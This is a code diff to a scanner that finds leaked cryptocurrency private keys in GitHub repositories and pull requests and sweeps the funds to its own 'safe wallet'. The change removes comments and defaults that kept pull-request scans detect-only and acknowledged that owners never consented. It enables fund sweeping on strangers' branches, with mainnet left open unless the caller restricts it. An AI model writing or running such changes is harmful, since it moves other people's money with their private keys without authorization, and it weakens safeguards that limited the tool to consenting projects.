@@ -3,6 +3,9 @@ import { deriveCandidates, type AccountCandidate } from "./deriveAddress";
 import { rescueFunds } from "./rescue";
 import { recordRescue } from "./ledger";
 import { RPC_URL, SAFE_WALLET, STRK_TOKEN, ETH_TOKEN, type Network } from "./networks";
+import { maskRepo } from "./mask";
+
+export { maskRepo };
 
 export type { Network };
 
@@ -59,14 +62,18 @@ export interface ScanResult {
 
 export interface ScanOptions {
   // Detect and report only — never sweep funds, never write to the ledger.
-  //
-  // The registry scan runs with rescue enabled: those projects opted into
-  // being watched by registering for the sprint. Anything else must not,
-  // for two separate reasons. A visitor-supplied repo would otherwise let an
-  // anonymous request move real money, and a repo we merely discovered on
-  // GitHub belongs to someone who never asked us to touch their wallet.
+  // Used for anything a visitor can point at directly, so that an anonymous
+  // request can never be the thing that moves money.
   detectOnly?: boolean;
+  // Which networks a rescue may actually touch. Omitted means every network
+  // that has a safe wallet configured. The ecosystem sweep restricts this to
+  // testnet while it is being trialled: the detection logic is identical on
+  // both chains, so a Sepolia run proves the pipeline end to end without
+  // taking custody of mainnet funds belonging to people who have not asked
+  // for any of this yet.
+  rescueNetworks?: Network[];
 }
+
 
 function shannonEntropy(s: string): number {
   const freq: Record<string, number> = {};
@@ -381,7 +388,9 @@ async function scanFile(
       let rescueTxHash: string | undefined;
       let rescueAmount: number | undefined;
 
-      const safeAddress = opts.detectOnly ? null : SAFE_WALLET[network];
+      const rescueAllowedHere =
+        !opts.detectOnly && (opts.rescueNetworks ? opts.rescueNetworks.includes(network) : true);
+      const safeAddress = rescueAllowedHere ? SAFE_WALLET[network] : null;
       if (result.candidate && safeAddress) {
         const rescue = await rescueFunds(key, result.candidate, safeAddress, network);
         if (rescue.rescued) {
@@ -458,10 +467,10 @@ async function scanFile(
 // from the raw CDN for free. Fetching the PR's changed-file list through the
 // API instead would cost an extra call per PR for no more information.
 //
-// Always detect-only, with no way to opt in to rescuing. A PR is a proposal
-// from a third party, usually from their own fork; sweeping funds on the
-// strength of one would mean acting on a stranger's branch against an account
-// that may not even be theirs.
+// A key sitting in an open PR is already public, so the same reasoning applies
+// as anywhere else: waiting for it to be merged only gives the scrapers a head
+// start. Rescue is therefore allowed, but the caller decides which networks it
+// may touch — the sweep restricts that to testnet for now.
 
 const PR_HEADERS = () => {
   const h: Record<string, string> = {
@@ -502,7 +511,8 @@ async function fetchRawAtRef(path: string, ref: string, file: string): Promise<s
 
 export async function scanRepoPullRequests(
   repoUrl: string,
-  maxPrs = 10
+  maxPrs = 10,
+  opts: ScanOptions = { detectOnly: true }
 ): Promise<PrScanResult> {
   const path = repoPath(repoUrl);
   if (!path) {
@@ -540,7 +550,7 @@ export async function scanRepoPullRequests(
     for (const file of SENSITIVE_FILES) {
       const content = await fetchRawAtRef(headRepo, headSha, file);
       if (!content) continue;
-      findings.push(...(await scanFile(file, content, repoUrl, { detectOnly: true })));
+      findings.push(...(await scanFile(file, content, repoUrl, opts)));
     }
     if (findings.length > 0) {
       out.push({
